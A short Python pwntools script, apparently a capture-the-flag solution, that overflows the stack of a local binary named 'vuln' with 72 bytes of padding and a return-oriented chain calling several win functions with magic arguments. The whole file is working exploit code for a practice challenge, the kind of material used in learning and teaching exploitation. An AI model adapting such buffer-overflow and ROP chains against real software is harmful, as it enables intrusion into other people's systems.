#!/usr/bin/env python

from pwn import *

r = process("./vuln")
pause()

r.recvuntil("Welcome to 64-bit. Can you match these numbers?\n")
payload = (
    "A" * 72 +
    p64(0x4008b1) +
    p64(0x4009a3) + #  pop rdi; ret;
    p64(0xDEADBEEF) +
    p64(0x400767) +  # <win_fn1>
    
    p64(0x400781) + # <win_fn2>
    p64(0x4007be) + # next ret <win_fn>
    p64(0xBAADCAFE) + # arg1
    p64(0xCAFEBABE) + # arg2
    p64(0xABADBABE)  # arg3
)
r.sendline(payload)
print(r.recvall())

r.close()
